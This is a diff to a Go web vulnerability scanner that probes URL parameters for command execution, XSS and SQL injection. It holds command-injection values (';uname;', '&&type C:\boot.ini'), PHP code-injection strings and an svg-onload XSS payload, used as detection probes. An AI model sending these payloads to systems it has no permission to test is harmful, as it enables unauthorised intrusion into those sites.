@@ -61,23 +61,23 @@ func httpGet(url string) ([]byte, error) {
 }
 
 
-func rce_func(url string){
+func rce_func(url string) {
 	fmt.Println(" [!] Now Scanning for Remote Code/Command Execution ")
 	fmt.Println(" [!] Covering Linux & Windows Operating Systems ")
 	fmt.Println(" [!] Please wait ....")
-	payloads := []string{
+	payloads := []string {
 		";${@print(md5(bugyellow))}", 
 		";${@print(md5(\"bugyellow\"))}",
 		";uname;","&&dir", "&&type C:\\boot.ini", ";phpinfo();", ";phpinfo",
 	}
-	check, _ := regexp.Compile("e2dd25ca7e894d98802521471339dc60|Linux|eval()|SERVER_ADDR|Volume.+Serial|[boot")
+	check, _ := regexp.Compile("51107ed95250b4099a0f481221d56497|Linux|eval\\(\\)|SERVER_ADDR|Volume.+Serial|\\[boot")
 	main_function(url, payloads, check)
 }
 
-func xss_func(url string) {
+func xss_func(url string) error{
 	fmt.Println(" [!] Now Scanning for XSS ")
 	fmt.Println(" [!] Please wait .... ")
-	payloads := []string{
+	payloads := []string {
 		//"%3e%3c%27%22",
 		//"%253e%253c%2527%2522",
 		"%27%3Ebugyellow%3Csvg%2Fonload%3Dconfirm%28%2Fbugyellow%2F%29%3Eweb",
@@ -87,9 +87,10 @@ func xss_func(url string) {
 	}
 	check, _ := regexp.Compile("bugyellow<svg|x>x")
 	main_function(url, payloads, check)
+	return nil
 }
 
-func error_based_sqli_func(url string){
+func error_based_sqli_func(url string) {
 	fmt.Println(" [!] Now Scanning for Error Based SQL Injection ")
 	fmt.Println(" [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases ")
 	fmt.Println(" [!] Please wait .... ")
@@ -100,7 +101,7 @@ func error_based_sqli_func(url string){
 	main_function(url, payloads, check)
 }
 
-func main_function(url string,payloads []string,check *regexp.Regexp) error{
+func main_function(url string,payloads []string,check *regexp.Regexp) error {
 	//fmt.Println(payloads)
 	vuln := 0
 	for _, params := range strings.Split(strings.SplitN(url,"?",2)[1], "&"){
